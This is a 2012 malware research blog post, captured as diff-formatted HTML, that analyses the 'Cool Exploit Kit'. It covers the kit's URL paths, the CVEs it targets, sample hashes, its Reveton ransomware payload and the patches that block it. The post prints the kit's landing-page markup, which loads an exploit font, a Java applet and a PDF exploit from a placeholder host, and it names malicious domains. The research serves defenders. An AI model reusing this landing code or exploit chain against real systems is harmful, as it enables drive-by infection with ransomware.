+	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-114x114-precomposed.png">
+
+	
+	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-76x76-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-72x72-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-precomposed.png">	
+
+	<meta name="msapplication-TileImage" content="http://malware2.dontneedcoffee.com/assets/img/msapplication_tileimage.png">
+
+	<meta name="msapplication-TileColor" content="#fabb00">
+
+
+	
+
+</head>
+<body id="top-of-page" class="post">
+	
+	<div id="navigation" class="sticky">
+  <nav class="top-bar" role="navigation" data-topbar>
+    <ul class="title-area">
+      <li class="name">
+      <h1 class="show-for-small-only"><a href="http://malware2.dontneedcoffee.com" class="icon-tree"> MDNC | Malware don't need Coffee</a></h1>
+    </li>
+       <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
+      <li class="toggle-topbar menu-icon"><a href="#"><span>Navigation</span></a></li>
+    </ul>
+    <section class="top-bar-section">
+
+      <ul class="right">
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware2.dontneedcoffee.com/search/">Search</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware2.dontneedcoffee.com/contact/">Contact</a></li>
+
+            
+            
+          
+        
+        
+      </ul>
+
+      <ul class="left">
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware2.dontneedcoffee.com/">Home</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/blog/">Blog</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/blog/external/">External Blog</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/blog/archive/">Blog Archive</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware2.dontneedcoffee.com/faq/">FAQ</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/headers/">Header Styles</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-full-width-image/">Header with Full-Width-Image</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-image-pattern/">Header with Image and Pattern</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-image-color/">Header with image and color</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-logo-only/">Header Only With Logo</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/header-with-text/">Header With Text</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/no-header/">No Header</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/design/no-header-but-image/">No Header but Image</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/documentation/">Documentation</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/changelog/">Changelog</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/roadmap/">Roadmap</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+        
+      </ul>
+    </section>
+  </nav>
+</div><!-- /#navigation -->
+
+	
+
+	
+
+<div id="masthead-no-image-header">
+	<div class="row">
+		<div class="small-12 columns">
+			<a id="logo" href="http://malware2.dontneedcoffee.com" title="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+				<img src="http://malware2.dontneedcoffee.com/assets/img/logo.png" alt="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+			</a>
+		</div><!-- /.small-12.columns -->
+	</div><!-- /.row -->
+</div><!-- /#masthead -->
+
+
+
+
+
+
+
+
+	<div class="row t30">
+	<div class="medium-8 columns medium-offset-2 end">
+		<article itemscope itemtype="http://schema.org/Article">
+			<header>
+				
+
+				<div itemprop="name">
+					
+					<h1>Cool Exploit Kit - A new Browser Exploit Pack on the Battlefield with a "Duqu" like font drop</h1>
+				</div>
+			</header>
+
+
+			
+
+			<div itemprop="articleSection">
+			<div class="separator" style="clear: both; text-align: center;"></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-MWdzB7RGtQg/UHQFSSuMPII/AAAAAAAABk0/1avi1Nyz4vc/s1600/screenshot_511.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://3.bp.blogspot.com/-MWdzB7RGtQg/UHQFSSuMPII/AAAAAAAABk0/1avi1Nyz4vc/s1600/screenshot_511.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Just for the &nbsp;left panel Thumbnail :)</td></tr></tbody></table><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-V1ltO86TLso/UHNnWBO9dPI/AAAAAAAABdc/dqvZq8BUCCk/s1600/screenshot_495.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://4.bp.blogspot.com/-V1ltO86TLso/UHNnWBO9dPI/AAAAAAAABdc/dqvZq8BUCCk/s1600/screenshot_495.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Stats page title</td></tr></tbody></table><br /><br /><i><span style="color: #351c75;">Sorry for the "read it live" post...the situation was moving while writing.</span></i><br /><br />Few days ago i discovered that a bunch of reverse proxies that I was linking to same Blackhole Exploit Kit were in fact linked to 2 different Blackhole (quite surely operated by same team -&nbsp;I saw reverse proxies being redirected from one server to another one)<br /><br />Trying to build a signature to know which server was behind a specific reverse, I found a new exploit kit.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-7wbhkFhqR88/UHNJQQhwptI/AAAAAAAABcM/_UInEqj9Vus/s1600/screenshot_397.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-7wbhkFhqR88/UHNJQQhwptI/AAAAAAAABcM/_UInEqj9Vus/s1600/screenshot_397.png" /></a></div><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-f2l9mRp7UBE/UHNJkT5QSeI/AAAAAAAABcU/Epj0VMHhJL8/s1600/screenshot_398.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="471" src="http://2.bp.blogspot.com/-f2l9mRp7UBE/UHNJkT5QSeI/AAAAAAAABcU/Epj0VMHhJL8/s640/screenshot_398.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Empty default stats</td></tr></tbody></table><br />I fast noticed few things.<br />/r/pricelist.php is a PDF exploit.<br />/r/myadv.php is a Java pack.<br />/font.php is a Reveton PE.<br /><br /><br />I thought it would take weeks before it goes wild..but yesterday&nbsp;<a href="http://www.malekal.com/">Malekal</a> catched a landing spreading Reveton (blood.falawllp.info /r/l/town-proved.php&nbsp;) and I immediately recognized that new EK. So &nbsp;I hunted the malvertising and found another domain but same landing pointing to an already known Reverse Proxy.<br /><br />Seems like it was time to take a deep look at this EK.<br /><br />Small improvement, it looks like the "Sploit pack" is being checked by tools like Scan4you.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-F2BZrP4wLbo/UHNqC0PdHaI/AAAAAAAABeY/5mY4bi5_ikI/s1600/screenshot_492__.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="145" src="http://2.bp.blogspot.com/-F2BZrP4wLbo/UHNqC0PdHaI/AAAAAAAABeY/5mY4bi5_ikI/s640/screenshot_492__.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"></div><br /><br />&nbsp;When i first checked it, payload was not being pushed (all night long : no payload)<br /><div><br /></div><div><u>CVE-2012-4681 - IE - WinXP 32b</u></div>try.addsdice.com&nbsp;/r/l/town-proved.php<i><span style="color: #351c75;"> &lt;-- try.addsdice.com full of meaning no ?</span></i><br />try.addsdice.com /r/32size_font.eot <i><span style="color: #351c75;">&lt;- ?</span></i><br />try.addsdice.com /r/pricelist.php<br />try.addsdice.com /r/myadv.php.pack.gz&nbsp;<i><span style="color: #351c75;">&lt;- ?</span></i><br />try.addsdice.com /r/myadv.php<br />try.addsdice.com /r/myadv.php<br />try.addsdice.com /r/l//r/f.php?k=1<span style="color: #351c75;"><i> &lt;-- Vuln tracer for owner (seems guest does not have access to vuln break %)</i></span><br /><br /><br /><u>CVE-2012-4681 - Firefox - WinXP 32b</u><br />try.addsdice.com&nbsp;/r/l/town-proved.php<br />try.addsdice.com&nbsp;/r/pricelist.php<br />try.addsdice.com&nbsp;/r/l//r/f.php?k=1<br /><div><br /></div><u>CVE-2012-0507 - IE - Win7 64b</u><br />21x.xx.11x.1xx /r/l/town-proved.php<br />21x.xx.11x.1xx /r/64size_font.eot&nbsp;&nbsp;<i><span style="color: #351c75;">&lt;- ?</span></i><br />21x.xx.11x.1xx /r/pricelist.php<br />21x.xx.11x.1xx /r/myadv.php<br />21x.xx.11x.1xx /r/myadv.php<br />21x.xx.11x.1xx &nbsp;/r/l//r/f.php?k=2<br /><br /><u>CVE-2012-1723 - IE - Win7 64b</u><br />21x.xx.11x.1xx&nbsp;/r/l/town-proved.php<br />21x.xx.11x.1xx&nbsp;/r/64size_font.eot&nbsp;&nbsp;<i><span style="color: #351c75;">&lt;- ?</span></i><br />21x.xx.11x.1xx&nbsp;/r/pricelist.php<br />21x.xx.11x.1xx&nbsp;/favicon.ico<br />21x.xx.11x.1xx&nbsp;/r/myadv.php<br />21x.xx.11x.1xx&nbsp;/r/f.php?k=4<br /><br /><br /><u>MDAC (you should not be hurt):</u><br />21x.xx.11x.1xx&nbsp;/r/l/town-proved.php<br />21x.xx.11x.1xx&nbsp;/r/32size_font.eot<br />21x.xx.11x.1xx&nbsp;/r/pricelist.php<br /><br /><br /><u>Not up to date </u><u>Win7 64b</u><u>&nbsp;- IE - &nbsp;(j7u7)</u><br />Note that there is NO payload on the EK right now, don't known how to be 100% sure the CVE is indeed active and that it's this CVE which is being used or a new thing...<br />try.addsdice.com /r/l/town-proved.php<br />try.addsdice.com /r/64size_font.eot<br />try.addsdice.com /r/pricelist.php<br />try.addsdice.com /favicon.ico<br />try.addsdice.com /r/f.php?k=4&nbsp;&nbsp;<i><span style="color: #351c75;">&lt;- ?</span></i><br />try.addsdice.com /r/myadv.php<br />try.addsdice.com /r/myadv.php<br />try.addsdice.com /r/myadv.php<br /><br /><br />town-proved.php with IE &nbsp;contains :<br /><span style="color: #000066; font-family: &quot;verdana&quot; , sans-serif; font-size: x-small;"><br /></span><span style="color: #000066; font-family: &quot;verdana&quot; , sans-serif; font-size: x-small;">&lt;style&gt;@font-face{font-family:'p1';src:url('http://BEEPBEEP/64size_font.eot');}.duqu{font-size:5px;line-height:normal;font-family:'p1';position:absolute;top:0px;left:0px;}&lt;/style&gt;&lt;/head&gt;&lt;body onload='try{window.focus();}catch(e){}'&gt;&lt;div class='duqu'&gt;:)&lt;/div&gt;&lt;applet archive='http://BEEPBEEP/myadv.php' code='ja.jh' width='468' height='200'&gt;&lt;/applet&gt;&lt;br&gt;&lt;br&gt;&lt;iframe src='http://BEEPBEEP/pricelist.php' width='468' height='468'&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;</span><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-EcsDXjEo8-4/UHPMcEdvegI/AAAAAAAABgQ/lj1oLWVymJE/s1600/screenshot_500.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="117" src="http://2.bp.blogspot.com/-EcsDXjEo8-4/UHPMcEdvegI/AAAAAAAABgQ/lj1oLWVymJE/s640/screenshot_500.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Source code of the landing pushed to IE on x64 windows</td></tr></tbody></table><br /><br /><b><u>.duqu</u></b> &lt;- aouch, eactly what we could expect from a font drop !<br /><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-y1LHu6Q5NAk/UHN-zN13miI/AAAAAAAABfU/pVRFDxCu6Ug/s1600/screenshot_497.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://3.bp.blogspot.com/-y1LHu6Q5NAk/UHN-zN13miI/AAAAAAAABfU/pVRFDxCu6Ug/s1600/screenshot_497.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Cool EK Tree</td></tr></tbody></table><br /><br />file.dll is a Reveton.<br />myadv.php (jar) -&nbsp;at least CVE-2012-4681, CVE-2012-507, CVE-2012-1723<br /><div><a href="https://www.virustotal.com/file/a9eeb3b306f41575e9e5bb846c7b51ccba15c3fb32dcb9cb085c78276952f3a7/analysis/1349732166/" style="text-align: -webkit-auto;">0383be9bdb140f4588f5fb7c14d29fbd</a></div><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-y1PCEUBYjuY/UHP3697Q_FI/AAAAAAAABjk/lVyoh9LVPqw/s1600/screenshot_493.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="376" src="http://3.bp.blogspot.com/-y1PCEUBYjuY/UHP3697Q_FI/AAAAAAAABjk/lVyoh9LVPqw/s640/screenshot_493.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">CVE-2012-4681 spotted in jar file from Cool EK</td></tr></tbody></table><br /><br />filelist.php (pdf)&nbsp;- CVE-2010-0188<br /><a href="https://www.virustotal.com/file/3bffc22ce0e67144c1b10da968f32f4c/analysis/">3bffc22ce0e67144c1b10da968f32f4c</a> (2012-10-03) -&nbsp;<a href="http://wepawet.iseclab.org/view.php?hash=3bffc22ce0e67144c1b10da968f32f4c&amp;t=1349739053&amp;type=js">http://wepawet.iseclab.org/view.php?hash=3bffc22ce0e67144c1b10da968f32f4c&amp;t=1349739053&amp;type=js</a><br /><br />32size_font.eot :&nbsp;<a href="https://www.virustotal.com/file/7d399b92751b628fe226f9e3db82bf68516ba01120710254ed328adce50bd662/analysis/1349739494/" style="font-family: Tahoma; line-height: 14px; text-align: -webkit-auto;"><span style="color: blue; font-family: &quot;calibri&quot;;"><span style="font-size: 13pt;"><u>050fbef5c814b2981fa61b7fc6820cbd</u></span></span></a><br />64size_font.eot :&nbsp;<a href="https://www.virustotal.com/file/da5f4920e25dd619f3c4e3a36c11822d5d6f38b998df2a8f006f45e1defb0eee/analysis/1349739375/" style="font-family: Tahoma; line-height: 14px; text-align: -webkit-auto;"><span style="color: blue; font-family: &quot;calibri&quot;;"><span style="font-size: 13pt;"><u>fada0b184b5372863a0c51f7fef5e2d0</u></span></span></a><br /><br />How good is the "breaking" percentage ?<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-l1knlv75saA/UHPOhGqGO0I/AAAAAAAABgY/YoAhepn8Ya8/s1600/screenshot_499.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="508" src="http://3.bp.blogspot.com/-l1knlv75saA/UHPOhGqGO0I/AAAAAAAABgY/YoAhepn8Ya8/s640/screenshot_499.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Guest stats on 1 thread (we can estimte that it's Reveton Infection via one Traffer)</td></tr></tbody></table><br />Stats are moving and i can't get infected by that thread. Look like they are testing the EK in Traffic Analyser mode.<br /><br />[EDIT - While Writing this post]<br /><br />Around 10am French time got infected. As expected : Reveton.<br />So the Exploit Kit moved to production mode again.<br /><br />Tried to run the landing on a CVE-2011-3402&nbsp;positive computer with java 7u7 got infected (but &nbsp;it's not Java)<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-_HnnyD1lqjk/UHPmZusW97I/AAAAAAAABhU/ok5ulScLojo/s1600/screenshot_503.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-_HnnyD1lqjk/UHPmZusW97I/AAAAAAAABhU/ok5ulScLojo/s1600/screenshot_503.png" /></a></div><br />Payload:&nbsp;<span style="color: #0000ee; text-decoration: underline;">f15df53d8cca428d2dbe924fe1dff733</span><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-RoZn0Nfk7sw/UHP4ZsKqNdI/AAAAAAAABjs/PKf2v9Y7Xvg/s1600/screenshot_509.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="198" src="http://1.bp.blogspot.com/-RoZn0Nfk7sw/UHP4ZsKqNdI/AAAAAAAABjs/PKf2v9Y7Xvg/s320/screenshot_509.png" width="320" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Reveton for those who do not know (look <a href="https://www.botnets.fr/index.php/Reveton">botnets.fr/index.php/Reveton</a>)</td></tr></tbody></table><span style="color: #0000ee; text-decoration: underline;"><br /></span>Run it on a Fully patched IE 8/Windows on Win 64 and java 7u7 No infection.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-CSjkxNtwBA8/UHPmeoz1WPI/AAAAAAAABhc/CCSYLba6M-E/s1600/screenshot_501.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="98" src="http://1.bp.blogspot.com/-CSjkxNtwBA8/UHPmeoz1WPI/AAAAAAAABhc/CCSYLba6M-E/s640/screenshot_501.png" width="640" /></a></div><br />Tried to run the landing on a &nbsp;"Not up to date Win7 x64" &nbsp;positives computer without java : got infected<br /><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-UojXFyzikcU/UHPtjZtBhrI/AAAAAAAABig/FjZB1-wZZow/s1600/screenshot_507.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-UojXFyzikcU/UHPtjZtBhrI/AAAAAAAABig/FjZB1-wZZow/s1600/screenshot_507.png" /></a></div><br />Payload :&nbsp;<a href="https://www.virustotal.com/file/d9d2284386198be1a53ccc6e0f9ef878afcd19cb6024d258a4988679a20e7f7d/analysis/1349773067/">106f1f7e3a24d1ae9af0efc0934a4dcb</a><br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-Fad_gyKlmDc/UHPvGSFJCmI/AAAAAAAABio/pObDZXyOd9o/s1600/screenshot_508.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://4.bp.blogspot.com/-Fad_gyKlmDc/UHPvGSFJCmI/AAAAAAAABio/pObDZXyOd9o/s1600/screenshot_508.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Call Home from that Reveton payload.</td></tr></tbody></table><br /><br />Around 10:30 am : <a href="http://www.malekal.com/">Malekal</a> just found a new domain matching a known Reverse proxy that just switched from one BH EK server to this BH + Cool EK server.<br /><br /><br />I do not know what this font is about.<br />Is this a "new (?)" enabler for CVE-2012-4969. Is this another patched vuln from Internet Explorer ?<br />Am getting help to sort this out. Will update this post.<br /><br />&lt;edit1&gt; got answer by Kaspersky Labs : it's&nbsp;<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3402">CVE-2011-3402</a><br />so I s/CVE-2012-4969/CVE-2011-3402 this post...yes not ethical ;)<br />On my MDAC VM :<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-OFjJIDrVS4w/UHQw4R5sCwI/AAAAAAAABl0/YqP-xziClbE/s1600/screenshot_514.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://1.bp.blogspot.com/-OFjJIDrVS4w/UHQw4R5sCwI/AAAAAAAABl0/YqP-xziClbE/s1600/screenshot_514.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">KB2676562 fix CVE-2011-3402</td></tr></tbody></table>Removing this should allow exploitation - Work in progress.<br /><br />&lt;/edit1&gt;<br />&lt;edit2&gt;<br />After fighting hours with Updates and this EK (that was not Cool trust me) it seems that if you have at least one of this component installed, you are not vuln to the "Duqu-like" font drop :<br />-KB2676562 - <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3402">CVE-2011-3402</a><br />-KB2744842 - <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4969">CVE-2012-4969</a><br />-KB2718523 -&nbsp;<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1893">CVE-2012-1893</a>/<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1890">CVE-2012-1890</a><br />-Windows Explorer 9.0<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-synifguoFj4/UHS9ysi7WVI/AAAAAAAABm0/fF2L0yHAV-U/s1600/screenshot_529.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="354" src="http://1.bp.blogspot.com/-synifguoFj4/UHS9ysi7WVI/AAAAAAAABm0/fF2L0yHAV-U/s640/screenshot_529.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Downgrading a Windows 7x64 bits to see required "missing" KB to get owned<br />-= mean i removed this Patch.</td></tr></tbody></table>Sound not so awful. I add all md5, VT Link etc...and my future edit should be the Libtiff path if i find time , adding a map of the distribution of Reverse proxies and maybe link to the detailed/technical explanation of this "Duqu-like" font drop, if someone work on it.<br />&lt;/edit2&gt;<br />&lt;/edit4 15/10/12&gt; Added the Cool EK PokeAMole Board<br /><br />Here is it's distribution to play the Poke A Mole with the defense :<br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td><a href="http://3.bp.blogspot.com/-2xKOU25Nl4s/UHveo2umhCI/AAAAAAAAB04/Jt61UDLbZ_w/s1600/Cool+EK+PokeAMole+Board+-+13-10-2012_resize3.jpg" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="362" src="http://3.bp.blogspot.com/-2xKOU25Nl4s/UHveo2umhCI/AAAAAAAAB04/Jt61UDLbZ_w/s640/Cool+EK+PokeAMole+Board+-+13-10-2012_resize3.jpg" width="640" /></a></td></tr><tr><td class="tr-caption" style="font-size: 13px;">Cool EK Poke A Mole Board (Snapshot as I see it on 13/10/2012)<br />Explanation/Disclaimer at the End - Edit4<br />Too small ? :&nbsp;<a href="http://i.minus.com/ibbdTxd1LpqqHr.jpg">http://i.minus.com/ibbdTxd1LpqqHr.jpg</a></td></tr></tbody></table><br /><br /><br /><br />Credits for Components used in this model :&nbsp;<a href="http://pastebin.com/HsugYbhL">http://pastebin.com/HsugYbhL</a><br /><br /><u>Explanation :</u><br /><br />One server = One IP am aware of, on the 13/10/2012<br />One rectangle = /24 range<br />One color/server model &nbsp;= One AS<br />One traffer = One thread am aware of (quite sure there is more)<br /><br /><br /><u>Disclaimer :</u> It's a schema focused on Cool EK "PokeAMole" architecture and threads. We do not describe what happen before binary is pushed on the EK and after infection events.<br />So things are in some way<br />- simplified : traffer often have the same kind of architecture (many IP hiding a main server (TDS, Fake adv server, etc...)), there is often traffic exchange plaform increasing the number of hop, traffer can sometime be feed by botnets and are often feed by emailing/Iframe on compromised server (so other actors/hats are in the loop, selling credentials, pushing iframe).<br />There is a live case where automation is so well done, that two (it seems) guys can handle many hats (gathering credentials, mass iframing/emailing, traffic, EK, pushing Zbot/Pony, and gathering credentials...Perpetual motion ;) ).<br />- complexified : for instance on AS57999, it would be really surprising if there is more than one server. In my opinion there the PokeAMole is just a game of IP/Routing configuration.<br />But from outside what you face is the same as what is represented here + domain name rotation.<br /><br />&nbsp;&lt;edit4&gt;<br /><br /><br />&lt;edit3 without comment 12/10/12&gt;<br />New parameters e and f are appearing in the payload URL :<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Rm3C6xIyK6M/UHhZjrkazXI/AAAAAAAABzw/abyisN2uBak/s1600/screenshot_637.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Rm3C6xIyK6M/UHhZjrkazXI/AAAAAAAABzw/abyisN2uBak/s1600/screenshot_637.png" /></a></div>&lt;/edit3&gt;<br /><br />&lt;edit5 28/10/12&gt; It seems now that you need a direct access to get the final payload via java payload since 25/10/2012<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-_VpwMDt1VI4/UIxdQByuCTI/AAAAAAAACE4/3t4Hd3pVLX4/s1600/CoolEK.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="http://4.bp.blogspot.com/-_VpwMDt1VI4/UIxdQByuCTI/AAAAAAAACE4/3t4Hd3pVLX4/s640/CoolEK.png" width="640" /></a></div><br />Here are files to check by yourself (always happy to have feedback ;) ):<br /><a href="http://goo.gl/wx4jI">Jar Before &amp; After</a>&nbsp;<span style="font-size: x-small;">(OwnCloud via Goo.gl)</span><br /><a href="http://files.dontneedcoffee.com/public.php?service=files&amp;file=%2Fkafeine%2Ffiles%2Fmalware%2FCEK_Fiddler_Before%26After.zip">Fiddler Before &amp; After</a>&nbsp;<span style="font-size: x-small;">(OwnCloud via Goo.gl)</span><br />&lt;/edit5&gt;<br /><br /><b><u>Post Publication reading:</u></b><br /><a href="http://yomuds.blogspot.fr/2012/11/cve-2011-3402-and-cool-exploit-kit_28.html">CVE-2011-3402 and Cool Exploit Kit</a>&nbsp;- 2012-11-28 - yomuds -&nbsp;a bunch of random security bits!<br /><br />
+			</div>
+
+			
+						<div id="page-meta" class="t30">
+				<p>
+					<!-- Look the author details up from the site config. -->
+					
+					<!-- Output author details if some exist. -->
+					
+					<span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name" class="pr20 icon-edit"><a href="https://malware.dontneedcoffee.com/" target="_blank"> Kafeine</a></span>
+				</span>
+				
+
+				
+				<time class="icon-calendar pr20" datetime="2012-10-09" itemprop="datePublished"> 2012-10-09</time>
+				
+
+				<span class="icon-archive pr20"> </span>
+				<br />
+				<span class="pr20"><span class="icon-price-tag pr10"> Font</span> <span class="icon-price-tag pr10"> Duqu</span> <span class="icon-price-tag pr10"> Cool Exploit Kit</span> <span class="icon-price-tag pr10"> CVE-2011-3402</span> </span>
+			</p>
+
+			<div id="post-nav" class="row">
+				
+				<div class="small-5 columns"><a class="button small radius prev" href="http://malware2.dontneedcoffee.com/2012/10/citadelupdate1.3.5.1.html">&laquo; Update to Citadel : 1.3.5.1 Rain Edition.</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-2 columns text-center"><a class="radius button small" href="http://malware2.dontneedcoffee.com/blog/archive/" title="Blog Archive">Archive</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-5 columns text-right"><a class="button small radius next" href="http://malware2.dontneedcoffee.com/2012/10/reveton-autumn-collection-aucz-ie-no-14.html">Reveton Autumn Collection += AU,CZ, IE, NO & 17 new design &raquo;</a></div><!-- /.small-4.columns -->
+				
+			</div>
+			</div><!--  /.page-meta -->
+			
+
+			
+		</article>
+	</div><!-- /.medium-8.columns -->
+
+
+	
+
+
+	
+</div><!-- /.row -->
+
+
+	
+	    <div id="up-to-top" class="row">
+      <div class="small-12 columns" style="text-align: right;">
+        <a class="iconfont" href="#top-of-page">&#xf108;</a>
+      </div><!-- /.small-12.columns -->
+    </div><!-- /.row -->
+
+
+    <footer id="footer-content" class="bg-grau">
+      <div id="footer">
+        <div class="row">
